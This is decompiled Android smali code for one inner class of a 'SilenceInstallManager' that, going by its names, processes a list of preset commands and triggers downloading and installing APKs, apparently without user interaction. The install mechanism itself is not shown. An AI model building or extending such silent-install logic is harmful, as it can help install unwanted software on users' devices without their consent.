.class Lcow/silence/SilenceInstallManager$1;
.super Lcom/github/base/core/thread/TaskHelper$Task;
.source ""


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcow/silence/SilenceInstallManager;->requestSilenceInstallList(Z)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = null
.end annotation


# instance fields
.field public list:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "Lcow/silence/entity/PresetCommand;",
            ">;"
        }
    .end annotation
.end field

.field public final synthetic this$0:Lcow/silence/SilenceInstallManager;


# direct methods
.method public constructor <init>(Lcow/silence/SilenceInstallManager;)V
    .locals 0

    iput-object p1, p0, Lcow/silence/SilenceInstallManager$1;->this$0:Lcow/silence/SilenceInstallManager;

    invoke-direct {p0}, Lcom/github/base/core/thread/TaskHelper$Task;-><init>()V

    new-instance p1, Ljava/util/ArrayList;

    invoke-direct {p1}, Ljava/util/ArrayList;-><init>()V

    iput-object p1, p0, Lcow/silence/SilenceInstallManager$1;->list:Ljava/util/List;

    return-void
.end method


# virtual methods
.method public callback(Ljava/lang/Exception;)V
    .locals 4

    iget-object p1, p0, Lcow/silence/SilenceInstallManager$1;->list:Ljava/util/List;

    const/4 v0, 0x0

    if-eqz p1, :cond_3

    invoke-interface {p1}, Ljava/util/List;->size()I

    move-result p1

    if-lez p1, :cond_3

    iget-object p1, p0, Lcow/silence/SilenceInstallManager$1;->this$0:Lcow/silence/SilenceInstallManager;

    invoke-static {p1}, Lcow/silence/SilenceInstallManager;->access$400(Lcow/silence/SilenceInstallManager;)Ljava/util/LinkedList;

    move-result-object p1

    invoke-virtual {p1}, Ljava/util/LinkedList;->clear()V

    iget-object p1, p0, Lcow/silence/SilenceInstallManager$1;->list:Ljava/util/List;

    invoke-interface {p1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object p1

    :cond_0
    :goto_0
    invoke-interface {p1}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_2

    invoke-interface {p1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Lcow/silence/entity/PresetCommand;

    iget-object v2, p0, Lcow/silence/SilenceInstallManager$1;->this$0:Lcow/silence/SilenceInstallManager;

    invoke-static {v2}, Lcow/silence/SilenceInstallManager;->access$500(Lcow/silence/SilenceInstallManager;)Ljava/util/List;

    move-result-object v2

    invoke-static {v1, v2, v0}, Lcow/silence/helper/SilenceHelper;->needInstall(Lcow/silence/entity/PresetCommand;Ljava/util/List;Z)Z

    move-result v2

    if-eqz v2, :cond_0

    iget v2, v1, Lcow/silence/entity/PresetCommand;->mCommandStatus:I

    const/4 v3, 0x2

    if-ge v2, v3, :cond_1

    invoke-static {v1}, Lcow/silence/helper/SilenceHelper;->checkPresetCommand(Lcow/silence/entity/PresetCommand;)Z

    move-result v2

    if-eqz v2, :cond_0

    const-string v2, "SilenceInstall"

    const-string v3, ""

    invoke-static {v2, v3}, Lcom/cow/s/u/Logger;->d(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v2, p0, Lcow/silence/SilenceInstallManager$1;->this$0:Lcow/silence/SilenceInstallManager;

    invoke-static {v2}, Lcow/silence/SilenceInstallManager;->access$400(Lcow/silence/SilenceInstallManager;)Ljava/util/LinkedList;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/util/LinkedList;->add(Ljava/lang/Object;)Z

    goto :goto_0

    :cond_1
    if-ne v2, v3, :cond_0

    iget-object v2, v1, Lcow/silence/entity/PresetCommand;->mApkPath:Ljava/lang/String;

    invoke-static {v2}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_0

    iget-object v2, p0, Lcow/silence/SilenceInstallManager$1;->this$0:Lcow/silence/SilenceInstallManager;

    invoke-virtual {v2, v1}, Lcow/silence/SilenceInstallManager;->installByDownload(Lcow/silence/entity/PresetCommand;)V

    goto :goto_0

    :cond_2
    iget-object p1, p0, Lcow/silence/SilenceInstallManager$1;->this$0:Lcow/silence/SilenceInstallManager;

    invoke-static {p1}, Lcow/silence/SilenceInstallManager;->access$400(Lcow/silence/SilenceInstallManager;)Ljava/util/LinkedList;

    move-result-object p1

    invoke-virtual {p1}, Ljava/util/LinkedList;->size()I

    move-result p1

    if-lez p1, :cond_3

    iget-object p1, p0, Lcow/silence/SilenceInstallManager$1;->this$0:Lcow/silence/SilenceInstallManager;

    invoke-static {p1}, Lcow/silence/SilenceInstallManager;->access$400(Lcow/silence/SilenceInstallManager;)Ljava/util/LinkedList;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/LinkedList;->pop()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Lcow/silence/entity/PresetCommand;

    invoke-static {p1, v1}, Lcow/silence/SilenceInstallManager;->access$600(Lcow/silence/SilenceInstallManager;Lcow/silence/entity/PresetCommand;)V

    :cond_3
    iget-object p1, p0, Lcow/silence/SilenceInstallManager$1;->this$0:Lcow/silence/SilenceInstallManager;

    invoke-static {p1, v0}, Lcow/silence/SilenceInstallManager;->access$702(Lcow/silence/SilenceInstallManager;Z)Z

    return-void
.end method

.method public execute()V
    .locals 1

    iget-object v0, p0, Lcow/silence/SilenceInstallManager$1;->this$0:Lcow/silence/SilenceInstallManager;

    invoke-static {v0}, Lcow/silence/SilenceInstallManager;->access$300(Lcow/silence/SilenceInstallManager;)Ljava/util/List;

    move-result-object v0

    iput-object v0, p0, Lcow/silence/SilenceInstallManager$1;->list:Ljava/util/List;

    return-void
.end method
